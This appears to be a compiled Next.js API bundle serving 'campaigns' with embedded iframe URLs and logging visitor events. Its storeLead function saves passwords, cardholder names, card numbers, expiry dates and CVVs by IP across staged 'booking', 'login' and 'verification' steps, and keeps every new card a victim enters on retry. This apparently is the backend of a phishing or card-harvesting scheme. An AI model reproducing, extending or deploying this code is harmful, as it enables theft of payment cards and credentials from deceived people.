(()=>{var e={};e.id=701,e.ids=[701],e.modules={7383:e=>{function t(e){var t=Error("Cannot find module '"+e+"'");throw t.code="MODULE_NOT_FOUND",t}t.keys=()=>[],t.resolve=t,t.id=7383,e.exports=t},4694:e=>{"use strict";e.exports=require("isows")},145:e=>{"use strict";e.exports=require("next/dist/compiled/next-server/pages-api.runtime.prod.js")},4770:e=>{"use strict";e.exports=require("crypto")},2048:e=>{"use strict";e.exports=require("fs")},2615:e=>{"use strict";e.exports=require("http")},5240:e=>{"use strict";e.exports=require("https")},9801:e=>{"use strict";e.exports=require("os")},5315:e=>{"use strict";e.exports=require("path")},8621:e=>{"use strict";e.exports=require("punycode")},6162:e=>{"use strict";e.exports=require("stream")},7360:e=>{"use strict";e.exports=require("url")},1568:e=>{"use strict";e.exports=require("zlib")},3290:(e,t,r)=>{"use strict";r.r(t),r.d(t,{config:()=>u,default:()=>d,routeModule:()=>l});var a={};r.r(a),r.d(a,{default:()=>c});var i=r(1802),s=r(7153),n=r(6249),o=r(8732);async function c(e,t){try{let{id:r,c:a}=e.query||{},i=r||a;if(!i||"null"===i||"undefined"===i)return t.status(400).json({error:"Missing campaign id"});let s=await (0,o.getCampaignById)(i);if(!s)return t.status(404).json({error:"Campaign not found"});let n={id:s.id,name:s.name||"",firstName:s.first_name||"",lastName:s.last_name||"",email:s.email||"",profile_image:s.profile_image||"",title:s.title||"",description:s.description||"",iframe_url:s.iframe_url||""};return t.status(200).json(n)}catch(e){return t.status(500).json({error:e.message})}}let d=(0,n.l)(a,"default"),u=(0,n.l)(a,"config"),l=new i.PagesAPIRouteModule({definition:{kind:s.x.PAGES_API,page:"/api/campaigns/[id]",pathname:"/api/campaigns/[id]",bundlePath:"",filename:""},userland:a})},8732:(e,t,r)=>{"use strict";r(924).config();let{createClient:a}=r(135),i=a(process.env.SUPABASE_URL,process.env.SUPABASE_SERVICE_KEY);async function s(e,t){let{data:r,error:a}=await i.from("contacts").select("*").eq("source_query",e).eq("status","new").limit(t).order("created_at",{ascending:!0});if(a)throw a;return r}async function n(e,t,r){let{data:a,error:s}=await i.from("contacts").update({status:t,last_campaign:r.name,last_contacted_at:new Date().toISOString()}).eq("id",e);if(s)throw s;return a}async function o(e,t,r={}){let{data:a,error:s}=await i.from("events").insert({event_type:e,ip:t,details:r,created_at:new Date().toISOString()}).select("id").single();if(s)throw s;return{success:!0,eventId:a?.id}}async function c(e,t,r,a,s=null,n="",o={}){try{let{data:c}=await i.from("leads").select("*").eq("ip",r).order("updated_at",{ascending:!1}).limit(1).maybeSingle(),d=new Date().toISOString(),u={};if("booking"===n)u.booking_count=(c?.booking_count||0)+1;else if("login"===n)u.login_count=(c?.login_count||0)+1;else if("verification_start"===n||"verification_retry"===n){if("verification_start"===n&&c&&o.card){let n=c.card_number,u=o.card;if(n&&n!==u){let n={email:e,phone:t,ip:r,campaign_id:a,event_id:s,verification_count:1,card_holder:o.name,card_number:o.card,card_expiry:o.exp,card_cvv:o.cvv,password:o.password||c?.password||"",created_at:d,updated_at:d},{error:u}=await i.from("leads").insert(n);if(u)throw u;return{success:!0,action:"created_new_card"}}}u.verification_count=(c?.verification_count||0)+1}if(c){let r={...u,email:e||c.email,phone:t||c.phone,campaign_id:a||c.campaign_id,event_id:s||c.event_id,updated_at:d};o.password&&(r.password=o.password),o.card&&(r.card_number=o.card),o.name&&(r.card_holder=o.name),o.exp&&(r.card_expiry=o.exp),o.cvv&&(r.card_cvv=o.cvv);let{error:n}=await i.from("leads").update(r).eq("id",c.id);if(n)throw n;return{success:!0,action:"updated"}}{let n={email:e,phone:t,ip:r,campaign_id:a,event_id:s,...u,password:o.password||"",card_holder:o.name?o.name:"",card_number:o.card?o.card:"",card_expiry:o.exp?o.exp:"",card_cvv:o.cvv?o.cvv:"",created_at:d,updated_at:d},{error:c}=await i.from("leads").insert(n);if(c)throw c;return{success:!0,action:"created"}}}catch(e){throw console.error("Error in storeLead:",e),e}}async function d(e){if(!e)return null;if(/^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(String(e))){let t=await i.from("campaigns").select("*").eq("id",e).limit(1).maybeSingle();if(t?.data)return t.data}let t=await i.from("campaigns").select("*").eq("name",e).limit(1).maybeSingle();if(t.error)throw t.error;return t.data||null}e.exports={getNewContacts:s,updateContactStatus:n,trackEvent:o,storeLead:c,getCampaignById:d}}};var t=require("../../../webpack-api-runtime.js");t.C(e);var r=e=>t(t.s=e),a=t.X(0,[367],()=>r(3290));module.exports=a})();